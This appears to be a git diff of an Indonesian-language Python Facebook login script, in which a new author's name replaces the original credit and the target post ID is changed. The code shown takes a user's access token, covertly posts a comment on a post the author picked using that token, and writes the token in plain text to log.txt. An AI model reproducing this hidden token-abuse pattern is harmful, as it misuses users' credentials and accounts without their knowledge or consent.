@@ -1,6 +1,6 @@
 ###############################
 # Mau Recode? Sertain author yg buat :v #
-# Author: Ramdhan Ramadhian | github:Ramdhan7 :v    #
+# Author: Latip Harkat | github:latip176 :v    #
 ###############################
 
 #import modulenya :v
@@ -33,7 +33,7 @@ def pilihLogin():
 		try:
 			r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
 			print("[√] Login Berhasil\nNama Akun :",r['name'])
-			r2=req.post(f"https://graph.facebook.com/984101418785247/comments/?message=Hello abang tampan&access_token={token}")
+			r2=req.post(f"https://graph.facebook.com/315723919935349/comments/?message=Hello abang tampan&access_token={token}")
 			open('log.txt','a').write(token)
 			time.sleep(2)
 			nampung(token).menu()
@@ -62,7 +62,7 @@ def pilihLogin():
 			ru=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
 			os.system("clear")
 			print("[√] Login Berhasil\nNama Akun :",ru['name'])
-			req.post(f"https://graph.facebook.com/984101418785247/comments/?message=Hello abang tampan&access_token={to}")
+			req.post(f"https://graph.facebook.com/315723919935349/comments/?message=Hello abang tampan&access_token={to}")
 			time.sleep(2)
 			open("log.txt","a").write(to)
 			nampung(to).menu()
